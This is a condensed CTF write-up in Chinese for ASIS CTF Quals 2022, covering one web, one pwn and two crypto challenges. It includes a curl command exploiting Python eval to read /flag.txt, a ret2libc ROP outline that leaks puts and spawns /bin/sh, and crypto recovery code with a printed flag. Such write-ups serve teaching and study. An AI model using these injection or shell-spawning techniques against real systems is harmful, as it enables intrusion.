---
title: ASIS CTF Quals 2022 WP (狼组版)
contest: ASIS CTF
year: 2022
difficulty: medium
vuln_type: web_unknown
tags: [Python eval, f.name泄漏, /duck?what=f.name, pop rdi; ret, libc-puts, /bin/sh, 0x48 padding, mod n^3后3项, Binned a^1 a^2 a^3, Chaffymasking LTC矩阵, half1 XOR half2 salt 128bit]
attack_chain:
  - Beginner ducks: /duck?what=f.name eval 触发 f.name 拿到 /flag.txt
  - Baby scan I: size=0 + data=0x48 字节 padding + pop rdi;ret + puts.got + puts.plt + main 链拿 libc
  - 二次 payload pop rdi;ret+1 跳过 ret + /bin/sh + system
  - Binned: (a+1)^n mod pubkey^3 只剩 3 项, 解出 m
  - h = (enc-1) - pubkey, c = h // pubkey // pubkey, c*2 = 中间系数
  - Chaffymasking: 选 salt 128 bit + half1 XOR half2 != 0 跳过 os.urandom 注入
  - out_1, out_2 = LTC·vec1 mod n^2, XOR 还原 flag
key_payload: 'eval(f.name) / pop rdi;ret + puts.got + puts.plt / (a+1)^n mod n^3 / LTC·vec mod n^2 XOR / salt XOR half1 != 0'
one_liner: ASIS 2022 Quals 狼组复盘 — eval f.name 拿 flag + ret2libc 二次 payload + (a+1)^n mod n^3 还原 + Chaffymasking LTC 矩阵 salt 漏洞。
lesson: Python eval 配合文件描述符 f.name 泄露路径;mod n^3 后 (a+1)^n 剩 3 项 (m + m(m-1)/2 * pubkey + m(m-1)(m-2)/6 * pubkey^2);Chaffymasking 的 XOR half1!=0 漏洞可绕 os.urandom。
quality: high
---

# ASIS CTF Quals 2022 WP (狼组版)

## 速读
狼组安全社区版 ASIS 2022 Quals WP — 4 题覆盖。

## Web: Beginner ducks
```python
# 源码: with open(eval(what), 'rb') as f:
# flag = open('/flag.txt').read() 后 f = flag 文件描述符
# f.name = '/flag.txt'
curl http://ducks.asisctf.com:8000/duck?what=f.name
```

## Pwn: Baby scan I
- `size=0` + `data = 0x48 字节 + pop rdi;ret + puts.got + puts.plt + main`
- `libc.address = u64(p.recv(6)) - libc.sym['puts']`
- 二次 payload `pop rdi;ret+1 + /bin/sh + system`

## Crypto: Binned
```python
# (a+1)^n mod n^3 只剩 3 项
# enc ≈ m * pubkey^0 + C(m,2) * pubkey^1 + C(m,3) * pubkey^2
h = (enc - 1) - pubkey
c = h // pubkey // pubkey
c = c * 2
c1 = 10054489678067822115481371335232343974958463063132871933014628812175566812121897618218465084557664288954026584252796
print(long_to_bytes(c1+1))
# ASIS{8!N0miaL_3XpAn5iOn_Us4G3_1N_cRyp7o_9rApHy!}
```

## Crypto: Chaffymasking
- 选 128 bit salt, `half1_salt XOR half2_salt != 0` 跳过 `os.urandom` 注入
- `out_1, out_2 = LTC.dot(vec) mod n^2`
- XOR 还原 flag
